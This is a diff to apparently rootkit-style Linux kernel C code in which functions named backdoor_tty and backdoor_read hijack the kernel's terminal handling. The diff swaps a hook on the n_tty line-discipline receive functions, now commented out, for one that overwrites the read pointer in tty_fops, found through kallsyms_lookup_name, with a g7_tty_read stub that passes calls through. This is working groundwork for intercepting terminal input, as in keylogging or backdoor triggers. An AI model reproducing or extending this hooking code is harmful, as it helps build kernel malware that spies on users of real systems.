@@ -13,6 +13,8 @@ struct tty_ldisc_ops *ops;
 void (*current_receive_buf)(struct tty_struct *, const unsigned char *, char *, int);
 int (*current_receive_buf2)(struct tty_struct *, const unsigned char *, char *, int);
 
+ssize_t (*current_tty_read)(struct file *, char *, size_t, loff_t *);
+
 void
 backdoor_read(void)
 {
@@ -26,17 +28,30 @@ backdoor_read(void)
 void
 backdoor_tty(void)
 {
-    if (!ops && (ops = (struct tty_ldisc_ops *)kallsyms_lookup_name("n_tty_ops"))) {
-        if (ops->receive_buf2) {
-            atomic_set(&receive_buf2_count, 0);
-            current_receive_buf2 = ops->receive_buf2;
-            ops->receive_buf2 = g7_receive_buf2;
-        } else if (ops->receive_buf) {
-            atomic_set(&receive_buf_count, 0);
-            current_receive_buf = ops->receive_buf;
-            ops->receive_buf = g7_receive_buf;
-        }
+    if (!current_tty_read) {
+        current_tty_read = ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read;
+        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read = (void *)g7_tty_read;
     }
+
+    /* if (!ops && (ops = (struct tty_ldisc_ops *)kallsyms_lookup_name("n_tty_ops"))) { */
+    /*     if (ops->receive_buf2) { */
+    /*         atomic_set(&receive_buf2_count, 0); */
+    /*         current_receive_buf2 = ops->receive_buf2; */
+    /*         ops->receive_buf2 = g7_receive_buf2; */
+    /*     } else if (ops->receive_buf) { */
+    /*         atomic_set(&receive_buf_count, 0); */
+    /*         current_receive_buf = ops->receive_buf; */
+    /*         ops->receive_buf = g7_receive_buf; */
+    /*     } */
+    /* } */
+}
+
+ssize_t
+g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
+
+{
+
+    return current_tty_read(file, buf, count, off);
 }
 
 void
